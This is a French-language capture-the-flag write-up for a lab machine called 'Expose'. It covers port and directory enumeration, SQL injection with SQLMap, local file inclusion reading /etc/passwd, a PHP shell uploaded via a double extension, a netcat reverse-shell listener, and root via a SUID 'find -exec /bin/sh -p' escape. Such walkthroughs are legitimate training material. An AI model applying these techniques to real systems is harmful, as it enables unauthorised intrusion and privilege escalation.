# ROOM : Expose

# Infos

# Enumeration
## NMAP
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-02 14:41 EDT
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

Nmap scan report for 10.10.104.34
Host is up (0.039s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE                 VERSION
21/tcp   open  ftp                     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.50.195
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ac:53:4b:40:7a:3c:a7:0b:44:62:68:62:68:6f:10:98 (RSA)
|   256 03:e8:69:f4:5f:1e:dc:d2:41:6f:3a:da:6c:e7:ec:ba (ECDSA)
|_  256 77:be:e7:75:a6:ce:11:4f:df:98:e8:ed:8b:4c:da:8f (ED25519)
53/tcp   open  domain                  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: EXPOSED
1883/tcp open  mosquitto version 1.6.9
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/load/bytes/sent/15min: 0.27
|     $SYS/broker/load/messages/sent/1min: 0.91
|     $SYS/broker/load/connections/5min: 0.20
|     $SYS/broker/bytes/received: 18
|     $SYS/broker/bytes/sent: 4
|     $SYS/broker/load/bytes/sent/1min: 3.65
|     $SYS/broker/load/connections/15min: 0.07
|     $SYS/broker/load/bytes/received/15min: 1.19
|     $SYS/broker/load/messages/received/1min: 0.91
|     $SYS/broker/version: mosquitto version 1.6.9
|     $SYS/broker/heap/maximum: 49688
|     $SYS/broker/load/bytes/received/1min: 16.45
|     $SYS/broker/messages/received: 1
|     $SYS/broker/load/bytes/received/5min: 3.53
|     $SYS/broker/uptime: 99 seconds
|     $SYS/broker/load/sockets/15min: 0.07
|     $SYS/broker/store/messages/bytes: 178
|     $SYS/broker/load/connections/1min: 0.91
|     $SYS/broker/load/sockets/1min: 0.91
|     $SYS/broker/messages/sent: 1
|     $SYS/broker/load/sockets/5min: 0.20
|     $SYS/broker/load/messages/sent/5min: 0.20
|     $SYS/broker/load/bytes/sent/5min: 0.79
|     $SYS/broker/load/messages/received/15min: 0.07
|     $SYS/broker/load/messages/sent/15min: 0.07
|_    $SYS/broker/load/messages/received/5min: 0.20
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.62 seconds
```
Donc, un FTP vide, un SSH, un DNS, un HTTP sur le port 1337 et un port mqtt.
## GOBUSTER
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://expose.thm:1337/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 315] [--> http://expose.thm:1337/admin/]
/javascript           (Status: 301) [Size: 320] [--> http://expose.thm:1337/javascript/]
/phpmyadmin           (Status: 301) [Size: 320] [--> http://expose.thm:1337/phpmyadmin/]
```
La page **/admin** est une page avec un formulaire mais qui ne fonctionne visiblement pas avec écris **Is this the right admin portal?**.
La page **/javascript** est interdite.
La page **/phpmyadmin** pointe vers la page login de phpmyadmin.
### Gobuster suite
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://expose.thm:1337/admin
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/modules              (Status: 301) [Size: 323] [--> http://expose.thm:1337/admin/modules/]
/assets               (Status: 301) [Size: 322] [--> http://expose.thm:1337/admin/assets/]
```
Il s'agit du "squelette" de la page admin...
### Gobuster suite et fin !
Après avoir cherche dans tout les sens, que ce soit mqtt, dns, etc. je me décide a rescan avec d'autre wordlist.

Puis, le graal :
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://expose.thm:1337/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 315] [--> http://expose.thm:1337/admin/]
/javascript           (Status: 301) [Size: 320] [--> http://expose.thm:1337/javascript/]
/phpmyadmin           (Status: 301) [Size: 320] [--> http://expose.thm:1337/phpmyadmin/]
/admin_101            (Status: 301) [Size: 319] [--> http://expose.thm:1337/admin_101/]
Progress: 40622 / 56294 (72.16%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 40720 / 56294 (72.33%)
===============================================================
Finished
===============================================================
```
Il y enfaite une page **/admin_101** !!!

# Exploitation
Je voulais la brute-force avec hydra, mais après un test avec un compte aléatoire pour capturer la requête avec burpsuite, j'ai aussi intercepter la réponse que voici:
```
HTTP/1.1 200 OK
Date: Thu, 02 May 2024 20:33:07 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 111
Connection: close
Content-Type: application/json

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'hacker@root.thm'"
    ]
}
```
Mon choix ce porte donc naturellement vers une injection SQL, on va utiliser l'outil **SQLMap** pour trouver notre bonheur.
```
Database: expose
Table: user
[1 entry]
+----+-----------------+---------------------+--------------------------------------+
| id | email           | created             | password                             |
+----+-----------------+---------------------+--------------------------------------+
| 1  | hacker@root.thm | 2023-02-21 09:05:46 | V[...]1                              |
+----+-----------------+---------------------+--------------------------------------+
```
```
+----+------------------------------+-----------------------------------------------------+
| id | url                          | password                                            |
+----+------------------------------+-----------------------------------------------------+
| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (e[...]k)          |
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
+----+------------------------------+-----------------------------------------------------+
```
Je trouve bizarre que cela passe de l'id 1 a 3, ou est le 2 ?

Le mot de passe fonctionne bien, nous accèdons a une page avec un chat IA qui ne fonctionne pas
```
http://10.10.104.34:1337/admin_101/chat.php
```
```
We are at capacity right now

We're trying to resolve this issue as soon as possible
```
On va regarder du coter **/file1010111/index.php**
Cela pointe vers une page qui demande un mot de passe qui est **e[...]k**

Il nous affiche ce message 
```
Parameter Fuzzing is also important :) or Can you hide DOM elements? 
```
Quand on inspect on retrouve un petit hint :
```
 <p class="mb-4"><strong>Parameter Fuzzing is also important :)  or Can you hide DOM elements? <strong></p><span  style="display: none;">Hint: Try file or view as GET parameters?</span>
```
Et effectivement, l'url suivante fonctionne et donc montre une LFI (Local File Inclusion)
```
http://expose.thm:1337/file1010111/index.php?file=/etc/passwd
```
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin bind:x:115:122::/var/cache/bind:/usr/sbin/nologin Debian-snmp:x:116:123::/var/lib/snmp:/bin/false redis:x:117:124::/var/lib/redis:/usr/sbin/nologin mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin 
```
J'ai test de trouver des clé ssh etc. mais rien, puis je me suis souvenu de la seconde ligne:
```
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
```
Notre user est **zeamkish** donc je doit pouvoir accéder a cette page avec cet user.

On tombe sur une page qui nous permet d'upload un fichier .png.
```
http://expose.thm:1337/upload-cv00101011/index.php
```
J'upload un shell php avec l'extension **.png**, puis j'intercept la requête avec BurpSuite pour y ajouter **.png.php** comme extension, et cela fonctionne :
```
File uploaded successfully! Maybe look in source code to see the path
<span style=" display: none;">in /upload_thm_1001 folder
```
Je sais donc que mon shell ce trouve dans **/upload_thm_1001**
On execute le shell avec cette url :
```
http://expose.thm:1337/file1010111/index.php?file=../upload-cv00101011/upload_thm_1001/shell.png.php
```
et voila le revshell :
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444                           
listening on [any] 4444 ...
connect to [10.11.50.195] from (UNKNOWN) [10.10.48.246] 40172
Linux ip-10-10-48-246 5.15.0-1039-aws #44~20.04.1-Ubuntu SMP Thu Jun 22 12:21:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 08:04:49 up  1:15,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
# Post-Exploitation
Dans **/home/zeamkish** on retrouve des identifiants SSH
```
www-data@ip-10-10-48-246:/home/zeamkish$ cat ssh 
SSH CREDS
zeamkish
e[...]3
```
Une fois connecté en SSH, ca sera plus facile pour la suite
```
zeamkish@ip-10-10-48-246:~$ ls -la
total 36
drwxr-xr-x 3 zeamkish zeamkish 4096 Jul  6  2023 .
drwxr-xr-x 4 root     root     4096 Jun 30  2023 ..
-rw-rw-r-- 1 zeamkish zeamkish    5 Jul  6  2023 .bash_history
-rw-r--r-- 1 zeamkish zeamkish  220 Jun  8  2023 .bash_logout
-rw-r--r-- 1 zeamkish zeamkish 3771 Jun  8  2023 .bashrc
drwx------ 2 zeamkish zeamkish 4096 Jun  8  2023 .cache
-rw-r--r-- 1 zeamkish zeamkish  807 Jun  8  2023 .profile
-rw-r----- 1 zeamkish zeamkish   27 Jun  8  2023 flag.txt
-rw-rw-r-- 1 root     zeamkish   34 Jun 11  2023 ssh_creds.txt
zeamkish@ip-10-10-48-246:~$ cat flag.txt 
THM{[...]}
zeamkish@ip-10-10-48-246:~$ 
```
# Privesc to root
Je trouve ces bin avec suid :
```
-rwsr-xr-x 1 root root 313K Apr 10  2020 /usr/bin/nano
-rwsr-x--- 1 root zeamkish 313K Feb 18  2020 /usr/bin/find
```
Nous pouvons donc facilement passer root:
```
zeamkish@ip-10-10-74-190:/tmp$ /usr/bin/find . -exec /bin/sh -p \; -quit
# id
uid=1001(zeamkish) gid=1001(zeamkish) euid=0(root) groups=1001(zeamkish)
# ls -la /root
total 40
drwx------  5 root root 4096 Jun 11  2023 .
drwxr-xr-x 20 root root 4096 Jul 25 13:40 ..
-rw-------  1 root root  330 Jun 30  2023 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 Jun  2  2023 .local
-rw-------  1 root root   13 May 25  2023 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 May 25  2023 .ssh
-rw-r--r--  1 root root   23 Jun 11  2023 flag.txt
drwxr-xr-x  4 root root 4096 May 25  2023 snap
```
